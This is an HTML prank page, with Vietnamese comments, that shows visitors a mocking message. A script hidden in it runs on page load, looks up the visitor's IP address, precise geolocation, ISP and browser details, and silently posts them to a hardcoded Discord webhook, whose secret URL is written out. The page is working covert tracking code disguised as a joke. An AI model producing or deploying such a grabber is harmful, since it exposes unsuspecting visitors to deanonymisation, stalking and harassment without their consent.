<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>...</title>
</head>
<body style="margin:0;background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-size:40px;">

    m gayy 🏳️‍🌈

    <script>
        const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";

        async function sendInfo() {
            try {

                // Lấy IP + vị trí
                const res = await fetch("http://ip-api.com/json/?fields=66846719");
                const data = await res.json();

                // Thiết bị
                const device = navigator.userAgent;

                // Thời gian
                const time = new Date().toLocaleString();

                // Nội dung gửi Discord
                const payload = {
                    content:
`📱 Có người mở web

🕒 Thời gian:
${time}

🌍 IP:
${data.query}

🌎 Quốc gia:
${data.country}

🏙️ Thành phố:
${data.city}

📍 Khu vực:
${data.regionName}

📮 Zip:
${data.zip}

📡 Tọa độ:
Lat: ${data.lat}
Lon: ${data.lon}

🏢 Nhà mạng:
${data.isp}

🧠 Tổ chức:
${data.org}

🌐 ASN:
${data.as}

📱 Mobile:
${data.mobile}

🛡️ Proxy:
${data.proxy}

🖥️ Hosting:
${data.hosting}

🕒 Múi giờ:
${data.timezone}

💻 Thiết bị:
${device}`
                };

                // Gửi webhook
                await fetch(webhook, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.log(err);
            }
        }

        sendInfo();
    </script>

</body>
</html>
